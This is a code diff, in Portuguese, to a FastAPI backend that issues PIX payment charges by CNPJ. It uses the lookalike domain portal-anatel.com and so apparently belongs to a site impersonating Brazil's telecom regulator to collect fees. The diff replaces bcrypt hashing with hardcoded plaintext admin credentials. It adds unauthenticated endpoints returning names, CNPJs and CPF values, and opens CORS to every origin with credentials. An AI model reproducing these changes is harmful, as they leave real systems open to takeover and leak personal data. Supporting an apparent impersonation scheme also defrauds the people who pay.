@@ -18,7 +18,6 @@ import csv
 import io
 import random
 from jose import JWTError, jwt
-from passlib.context import CryptContext
 
 ROOT_DIR = Path(__file__).parent
 # Carregar apenas o .env do backend (todas as variáveis estão aqui agora)
@@ -47,11 +46,10 @@ SECRET_KEY = os.environ['JWT_SECRET_KEY']
 ALGORITHM = "HS256"
 ACCESS_TOKEN_EXPIRE_MINUTES = 60 * 24  # 24 horas
 
-# Senha do admin
-ADMIN_USERNAME = os.environ['ADMIN_USERNAME']
-ADMIN_PASSWORD_HASH = os.environ['ADMIN_PASSWORD_HASH']
+# Senha do admin (direta, sem hash)
+ADMIN_USERNAME = os.environ.get('ADMIN_USERNAME', 'anatel')
+ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD', 'fla10')
 
-pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")
 security = HTTPBearer()
 
 # Create the main app
@@ -122,10 +120,6 @@ class TokenResponse(BaseModel):
 
 
 # Helper Functions
-def verify_password(plain_password: str, hashed_password: str) -> bool:
-    """Verifica senha"""
-    return pwd_context.verify(plain_password, hashed_password)
-
 def create_access_token(data: dict, expires_delta: Optional[timedelta] = None):
     """Cria JWT token"""
     to_encode = data.copy()
@@ -381,11 +375,11 @@ async def health_check():
 async def login(credentials: LoginRequest):
     """Login administrativo - retorna JWT token"""
     
-    # Verificar credenciais
+    # Verificar credenciais (senha direta, sem hash)
     if credentials.username != ADMIN_USERNAME:
         raise HTTPException(status_code=401, detail="Usuário ou senha incorretos")
     
-    if not verify_password(credentials.password, ADMIN_PASSWORD_HASH):
+    if credentials.password != ADMIN_PASSWORD:
         raise HTTPException(status_code=401, detail="Usuário ou senha incorretos")
     
     # Criar token
@@ -1129,6 +1123,92 @@ async def get_recent_transactions(limit: int = 10):
     
     return {"transactions": transactions, "count": len(transactions)}
 
+
+# ─── Estatísticas de Links Únicos (PIX Gerados vs Pagos) ────────────────────────
+
+@api_router.get("/stats/links")
+async def get_links_stats():
+    """Estatísticas de links únicos - PIX gerados vs pagos"""
+    
+    # Total de transações (PIX gerados)
+    total_pix = await db.transactions.count_documents({})
+    
+    # PIX pagos
+    pix_pagos = await db.transactions.count_documents({'status': 'paid'})
+    
+    # PIX pendentes
+    pix_pendentes = await db.transactions.count_documents({'status': 'waiting_payment'})
+    
+    # PIX expirados/cancelados
+    pix_outros = total_pix - pix_pagos - pix_pendentes
+    
+    # Taxa de conversão
+    taxa_conversao = round((pix_pagos / total_pix * 100), 2) if total_pix > 0 else 0
+    
+    # Valor total arrecadado
+    pipeline = [
+        {'$match': {'status': 'paid'}},
+        {'$group': {'_id': None, 'total': {'$sum': '$valor'}}}
+    ]
+    result = await db.transactions.aggregate(pipeline).to_list(length=1)
+    valor_arrecadado = result[0]['total'] if result else 0
+    
+    # Estatísticas por CNPJ único
+    cnpjs_unicos = await db.transactions.distinct('cnpj')
+    cnpjs_pagos = await db.transactions.distinct('cnpj', {'status': 'paid'})
+    
+    # Últimas 24h
+    ontem = datetime.now(timezone.utc) - timedelta(hours=24)
+    pix_24h = await db.transactions.count_documents({
+        'created_at': {'$gte': ontem.isoformat()}
+    })
+    pagos_24h = await db.transactions.count_documents({
+        'status': 'paid',
+        'paid_at': {'$gte': ontem.isoformat()}
+    })
+    
+    return {
+        "total_pix_gerados": total_pix,
+        "pix_pagos": pix_pagos,
+        "pix_pendentes": pix_pendentes,
+        "pix_outros": pix_outros,
+        "taxa_conversao": taxa_conversao,
+        "valor_arrecadado": round(valor_arrecadado, 2),
+        "cnpjs_unicos": len(cnpjs_unicos),
+        "cnpjs_pagos": len(cnpjs_pagos),
+        "pix_24h": pix_24h,
+        "pagos_24h": pagos_24h
+    }
+
+
+@api_router.get("/stats/links/details")
+async def get_links_details(limit: int = 50, status: str = None):
+    """Detalhes de cada link/transação"""
+    
+    query = {}
+    if status:
+        query['status'] = status
+    
+    transactions = await db.transactions.find(query).sort('created_at', -1).limit(limit).to_list(length=limit)
+    
+    result = []
+    for tx in transactions:
+        result.append({
+            "id": tx.get('id'),
+            "cnpj": tx.get('cnpj'),
+            "nome": tx.get('nome'),
+            "valor": tx.get('valor'),
+            "status": tx.get('status'),
+            "cpf_utilizado": tx.get('cpf_utilizado'),
+            "created_at": tx.get('created_at'),
+            "paid_at": tx.get('paid_at'),
+            "search_method": tx.get('search_method'),
+            "gateway": tx.get('gateway', 'zippify')
+        })
+    
+    return {"transactions": result, "count": len(result)}
+
+
 # Endpoint de simulação para testes (REMOVER EM PRODUÇÃO)
 @api_router.get("/gateway/current", response_model=GatewayResponse)
 async def get_gateway():
@@ -1628,14 +1708,37 @@ async def reset_dashboard(current_user: str = Depends(get_current_user)):
 # Include router
 app.include_router(api_router)
 
-# CORS
-app.add_middleware(
-    CORSMiddleware,
-    allow_credentials=True,
-    allow_origins=os.environ.get('CORS_ORIGINS', '*').split(','),
-    allow_methods=["*"],
-    allow_headers=["*"],
-)
+# CORS - Configurado para aceitar todos os domínios (produção e preview)
+# IMPORTANTE: Em produção, o CORS deve aceitar portal-anatel.com e subdomínios
+cors_origins = os.environ.get('CORS_ORIGINS', '*')
+if cors_origins == '*':
+    # Aceita todas as origens
+    app.add_middleware(
+        CORSMiddleware,
+        allow_credentials=True,
+        allow_origins=["*"],
+        allow_methods=["*"],
+        allow_headers=["*"],
+        expose_headers=["*"],
+    )
+else:
+    # Lista específica de origens
+    origins_list = [o.strip() for o in cors_origins.split(',')]
+    # Adiciona domínios comuns
+    origins_list.extend([
+        "https://portal-anatel.com",
+        "https://www.portal-anatel.com",
+        "http://localhost:3000",
+        "http://localhost:8001",
+    ])
+    app.add_middleware(
+        CORSMiddleware,
+        allow_credentials=True,
+        allow_origins=origins_list,
+        allow_methods=["*"],
+        allow_headers=["*"],
+        expose_headers=["*"],
+    )
 
 @app.on_event("shutdown")
 async def shutdown_db_client():
